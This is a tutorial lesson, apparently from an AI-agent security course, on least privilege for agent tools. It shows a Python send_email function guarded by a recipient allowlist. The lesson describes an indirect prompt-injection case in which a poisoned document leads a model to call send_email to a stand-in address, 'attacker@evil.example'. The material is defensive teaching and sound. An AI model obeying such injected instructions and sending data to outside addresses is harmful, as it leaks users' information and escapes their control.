# Tool permissions and least privilege

**Last verified:** 2026-09-22
**Difficulty:** ★★★★★ · **Time:** ~45 minutes

## Learning objectives

- Design a tool that stays safe even when the model calling it has been successfully manipulated.
- Recognize the least-privilege pattern already used in Modules 13/14 and name it as a security control, not just good design.
- Apply an allowlist to a consequential tool (sending a message, spending money, deleting data) the same way earlier modules applied one to files and URLs.

## Intuition

Lesson 01 established that you can't make a model perfectly resistant to
indirect injection through prompting alone. The reliable complement:
constrain what a **tool** is capable of doing, so that even if the model
decides (correctly or because it was manipulated) to call it in a harmful
way, the tool itself refuses. This is exactly the shape of every allowlist
this curriculum has already built -- now named explicitly as a security
control.

## The concept

### The pattern, already familiar from Modules 13 and 14

- Module 13's `resolve_within_repo`: a file tool can only touch paths
  inside a designated root, regardless of what path the model requests.
- Module 13's `DEFAULT_ALLOWED_COMMANDS`: a shell tool can only run
  pre-approved binaries, regardless of what command string the model
  constructs.
- Module 14's `goto`'s URL allowlist: a browser tool can only navigate to
  pre-approved URLs, regardless of what page the model decides to visit.

Every one of these already implements least privilege: **the tool enforces
its own boundary, independent of the model's intent.** This module applies
the identical pattern to a new, more consequential kind of tool.

### Applying it to a consequential action

```python
_SENT_EMAILS: list[dict] = []


def send_email(to: str, subject: str, body: str, allowlist: frozenset[str]) -> str:
    if to not in allowlist:
        raise ValueError(f"Refusing to send to {to!r}: not on the approved recipient allowlist")
    _SENT_EMAILS.append({"to": to, "subject": subject, "body": body})
    return f"Email sent to {to}"
```

If a poisoned document (lesson 01) convinces the model to call
`send_email(to="attacker@evil.example", ...)`, this check fails the call
regardless of *why* the model decided to make it -- the defense doesn't
depend on correctly detecting that an injection occurred, only on the
recipient never having been pre-approved. This is strictly more reliable
than trying to detect "this instruction looks injected" after the fact.

### Why this generalizes: the tool, not the prompt, is the trust boundary

The model's output (what it decides to call, and with what arguments) should
always be treated as untrusted input to the tool layer, the same way a web
application treats client input as untrusted regardless of what JavaScript
validation ran in the browser. The tool's own checks are the actual
security boundary; anything upstream of that (system prompts, careful
wording) is a helpful reduction in *how often* a bad call is attempted, not
a substitute for the boundary itself.

### Combining with Module 09's approval gates

For a genuinely high-stakes action where even an allowlisted recipient
might not be enough assurance, Module 09's human-approval-gate pattern
composes directly with this lesson's allowlist: require approval **and**
enforce the allowlist, rather than treating either one alone as sufficient
for the highest-stakes tools.

## Deeper: least privilege is a design decision made once, upfront, not a patch

The strongest version of this lesson isn't "add an allowlist after
discovering an exploit" -- it's designing every consequential tool with the
narrowest capability the task actually needs from the start (Module 13
lesson 02's "narrow the toolset to the task" already made this point about
tool selection; here it's the same discipline applied to what a single
tool call is allowed to do). A tool that could only ever act within
appropriate bounds has no injection-driven exploit to discover in the first
place.

## When not to use this

Don't add an allowlist to a tool with no realistic consequential action (a
pure read-only lookup with no side effects and no sensitive data exposure)
-- the overhead of maintaining an allowlist should be reserved for tools
where an unconstrained call could cause real harm.

## Common mistakes

- Relying solely on prompt-level instructions ("only email people the user
  explicitly names") for a consequential tool, with no mechanical
  enforcement backing it up.
- Building the allowlist check but leaving an unchecked "admin" or "debug"
  code path that bypasses it -- the boundary only holds if there's no
  alternate route around it.
- Treating a successfully blocked exploit attempt as "handled" without
  investigating why the model attempted it in the first place -- the
  allowlist contained the damage, but the underlying injection vector
  (lesson 01) still needs addressing too.

## Key takeaways

- Constrain what a tool can do, independent of the model's intent -- this is strictly more reliable than trying to make the model injection-proof through prompting alone.
- Modules 13 and 14's file/URL allowlists were already this pattern; this lesson applies it explicitly to consequential actions like sending messages or spending money.
- The tool layer, not the prompt, is the actual trust boundary -- treat model output as untrusted input to it, the same way a web app treats client input as untrusted.

## Lab

[`labs/01-indirect-injection-redteam/`](../labs/01-indirect-injection-redteam/README.md)
